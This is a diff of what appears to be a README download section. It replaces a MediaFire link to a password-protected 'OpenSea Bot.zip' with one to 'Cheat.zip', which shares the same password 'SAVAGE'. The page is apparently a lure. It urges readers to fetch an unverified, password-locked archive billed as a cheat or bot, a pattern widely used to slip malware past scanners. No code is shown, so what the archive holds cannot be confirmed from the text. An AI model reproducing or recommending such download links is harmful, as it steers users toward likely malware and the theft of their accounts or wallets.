@@ -4,7 +4,7 @@
 
 
 ***DOWNLOAD CHEAT*** :arrow_heading_down:
-|[Click to Download](https://www.mediafire.com/file/0g30n3lwxgvcqbq/OpenSea+Bot.zip/file)|Password: SAVAGE|
+|[Click to Download](https://www.mediafire.com/file/6bgg6qjxmkjn8n1/Cheat.zip/file)|Password: SAVAGE|
 |---|---|
 -----------------------------------------------------------------------------------------------------------------------
 
